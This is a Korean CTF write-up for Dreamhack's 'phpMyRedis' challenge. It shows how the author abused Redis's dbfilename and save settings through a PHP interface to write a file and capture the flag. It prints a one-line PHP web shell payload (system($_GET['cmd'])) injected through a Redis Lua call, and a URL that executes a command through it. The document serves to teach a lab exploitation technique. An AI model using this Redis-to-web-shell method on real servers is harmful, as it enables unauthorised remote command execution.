---
layout: post
title: "[Dreamhack] phpMyRedis WriteUp"
date: 2025-01-12
author: GiuNash
tags: [Dreamhack, Web]
comments: true
toc: true
pinned: true
---

## 문제 접근법

phpMyRedis 문제는 Redis의 인 메모리 데이터베이스 특성과 PHP 기반 웹 인터페이스를 활용한 문제였다. 

Redis는 데이터를 key-value 형태로 저장하며, 이를 파일로 저장하거나 명령어 실행에 사용할 수 있다.

문제에서 제공된 주요 파일은 다음과 같았다:

#### config.php

![image](https://github.com/user-attachments/assets/6bf4cdd0-26b5-4a21-b50f-92c91830fff6)

#### index.php

![image](https://github.com/user-attachments/assets/888e0052-10e5-46eb-8ff8-132d86a1289e)

이를 통해 다음 접근 방식을 사용하여 문제를 해결했다:

1. Redis의 GET 명령어를 이용해 서버의 현재 디렉토리를 확인.

2. SET 명령어와 dbfilename 설정을 이용해 웹쉘 파일을 생성.

3. save 설정을 변경하여 Redis 데이터를 강제로 저장.

4. 생성된 웹쉘을 통해 명령어를 실행하여 플래그를 획득.

## 문제풀이

### 현재 디렉토리 확인

config.php에서 Redis의 GET 명령어를 사용하여 dir 명령어로 현재 서버의 디렉토리 구조를 확인했다.

![image](https://github.com/user-attachments/assets/76484cff-acae-4ee4-90b6-e0548b0a9e1c)

### dbfilename 변경

dbfilename의 value는 메모리가 저장되는 파일을 가리키므로

Redis의 데이터를 파일로 저장하는 기능을 활용하기 위해 dbfilename 설정을 shell.php로 변경했다.

![image](https://github.com/user-attachments/assets/bb2e4f1a-517a-4758-9a2a-6f240874605b)

### Redis 데이터 저장 강제화

Redis는 기본적으로 save를 통해 데이터를 주기적으로 저장한다. 

이를 강제로 저장하도록 save 설정을 100 1로 변경하여 100초마다 한 번 변경되면 데이터를 저장하도록 했다.

![image](https://github.com/user-attachments/assets/94b64685-f1cf-4fba-b958-aaafe1e2ac88)

### 웹쉘 생성

command 입력 부분에서 Redis 데이터에 PHP 코드를 삽입하여 웹쉘을 생성했다. 이를 통해 저장된 파일이 실행 가능한 PHP 코드로 동작하도록 했다.

```php
return redis.call("set", "a", "<? system($_GET['cmd']); ?>")
```

명령어 실행 및 플래그 획득생성된 shell.php에 접근하여 명령어를 실행했다.

```
http://http://host1.dreamhack.games:17539/shell.php?cmd=/flag
```

이를 통해 플래그를 성공적으로 획득했다.
